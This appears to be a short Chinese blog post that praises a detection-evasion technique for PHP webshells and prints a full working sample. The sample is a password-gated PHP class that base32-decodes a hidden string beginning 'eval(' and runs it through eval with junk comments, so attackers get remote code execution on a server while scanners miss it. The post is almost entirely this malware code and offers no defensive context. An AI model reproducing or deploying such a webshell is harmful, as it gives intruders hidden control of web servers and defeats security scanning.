<p>这个简直太强大了</p>
<p>一直以来我以为无法过是因为 eval 的原因， 看了很多免杀，都是使用assert </p>
<p>php 7.1 以后就无法使用assert 了。</p>
<p>所以看起来还是没问题的。</p>
<p>估计以后 使用自行加密、解密的方式是绕过的主流</p>
<pre>&lt;?php
class PLRN{
  public $DLUG = null;
  public $FVRE = null;
  function __construct(){
    if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){
      $this-&gt;DLUG = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
      $this-&gt;FVRE = @XGAV($this-&gt;DLUG);
      @eval("/*M]Eq[%e*/".$this-&gt;FVRE."/*M]Eq[%e*/");
    }
  }
}
new PLRN();
function NXUM($NHML){
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    $DTSE = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($NHML); $i &lt; $j; $i++){
    $v &lt;&lt;= 8;
        $v += ord($NHML[$i]);
        $vbits += 8;
        while ($vbits &gt;= 5) {
            $vbits -= 5;
            $DTSE .= $BASE32_ALPHABET[$v &gt;&gt; $vbits];
            $v &amp;= ((1 &lt;&lt; $vbits) - 1);}}
    if ($vbits &gt; 0){
        $v &lt;&lt;= (5 - $vbits);
        $DTSE .= $BASE32_ALPHABET[$v];}
    return $DTSE;}
function XGAV($NHML){
    $DTSE = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($NHML); $i &lt; $j; $i++){
        $v &lt;&lt;= 5;
        if ($NHML[$i] &gt;= 'a' &amp;&amp; $NHML[$i] &lt;= 'z'){
            $v += (ord($NHML[$i]) - 97);
        } elseif ($NHML[$i] &gt;= '2' &amp;&amp; $NHML[$i] &lt;= '7') {
            $v += (24 + $NHML[$i]);
        } else {
            exit(1);
        }
        $vbits += 5;
        while ($vbits &gt;= 8){
            $vbits -= 8;
            $DTSE .= chr($v &gt;&gt; $vbits);
            $v &amp;= ((1 &lt;&lt; $vbits) - 1);}}
    return $DTSE;}
?&gt;
</pre>
<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20230120_095934.png" /></p>
